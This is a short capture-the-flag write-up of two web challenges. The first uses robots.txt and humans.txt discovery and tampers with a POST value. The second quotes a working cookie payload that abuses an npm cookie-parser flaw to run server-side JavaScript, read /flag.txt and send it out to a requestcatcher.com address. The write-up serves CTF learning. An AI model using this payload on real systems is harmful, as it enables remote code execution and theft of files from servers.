source - https://blog.hamayanhamayan.com/entry/2024/02/18/114825

# conquest
on entering the url, we see some random text, kind of like a poem. Anyways, I went to /robots.txt since this is a useful place to check. here, I found the next directory
`/tournament` I couldn't get past this stage in the ctf. After reading a writeup, I found out that we're supposed to go to humans.txt file after this
so we go to `/tournament/humans.txt`. on pressing the button that appears here, a post request gets sent to `/legend`. In the post request body, there is a key named `slay` with some random value.
all we need to do is to set this value very high to get the flag.

# just weird things
![image](https://github.com/Ryuou02/ctf-writeups/assets/133224167/818b174b-20ea-43e9-ba5c-567408c9c7c1)
the front page looks kind of like this, it has a default value given as JWT. you can change the name to be anything and it gets inserted in the jwt cookie.
The flag is not obtainable by changing the name since the flag doesn't get fetched from the file to any variable.
Hence it needs to be some kind of vulnerability where you can access the file
in the writeup, they wrote code like this - 
```
>>> import requests
>>> requests.get("http://localhost:32768/", headers={"Cookie": 'jwt=j:{"settings": {"view options": {"localsName": "locals = {body: this.constructor.constructor(`return (async ()=>(fs = await import(\'fs\'), http = await import(\'http\'), req = http.request(\' http://try1.requestcatcher.com/test?\'+fs.readFileSync(\'/flag.txt\')), req.end()))()`)()}"}}}'})
>>>
```
which is meant to exploit vulnerability with npm cookie parser. It gets the flag.txt file contents and sends it as a get request to our website. I found this service - https://requestcatcher.com/ to capture the get request.
